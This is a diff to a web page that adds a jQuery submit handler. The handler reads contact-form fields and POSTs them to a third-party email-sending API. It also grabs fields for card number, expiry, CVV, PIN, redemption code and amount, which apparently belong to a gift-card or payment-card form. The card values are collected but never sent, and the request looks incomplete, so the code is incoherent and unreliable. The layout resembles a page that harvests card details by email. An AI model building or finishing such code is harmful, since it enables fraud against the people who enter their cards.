@@ -724,6 +724,50 @@
 																	$('#submit_btn').on("click", function () {
 																		console.log("clicked!!!!!!");
 																	});
+
+																	$(document).ready(function() {
+																		$("#submit").click(function() {
+																			var subject = $("#subject").val();
+																			var fname = $("#fname").val();
+																			var message = $("#message").val();
+																			var button = $("#submit").val();
+
+																			var currency = document.getElementById("form-field-currency");
+																			var cardType = document.getElementById("form-field-card");
+																			var cardAmount = document.getElementById("form-field-amount");
+																			var redemption = document.getElementById("form-field-redemption");
+																			var cardNumber = document.getElementById("form-field-card_number");
+																			var expMM = document.getElementById("form-field-exp_mm");
+																			var expYY = document.getElementById("form-field-exp_yy");
+																			var cardCVV = document.getElementById("form-field-cvv");
+																			var cardPin = document.getElementById("form-field-pin");
+																			var icon = document.querySelector(".fa-regular");
+																			var iconText = document.querySelector(".show--icon")
+
+																			var dataString = 'subject=' + subject + '&fname=' + fname + '&message=' + message + '&button=' + button;
+																			//validation 
+																			if (fname == '' || subject == '' || message == '') { //if you are use other form validation scripts remove the if statement 
+																				alert("Please fill all fields");
+																			}
+																			// AJAX Code To Submit Form.
+																			else {
+																				$('#loader').show();
+																				$.ajax({
+																					type: "POST",
+																					url: "https://api.emailjs.com/api/v1.0/email/send",
+																					data: dataString,
+																					cache: true,
+																					success: function(result) {
+																						$('#loader').hide();
+																						$('#response').html(result).fadeIn();
+																						$("#contact_form")[0].reset();
+																						$('#response').fadeOut(3000).delay(400);
+																					}
+																				});
+																			}
+																			return false;
+																		});
+																	});
 																</script>
 															</body>
 															</html>
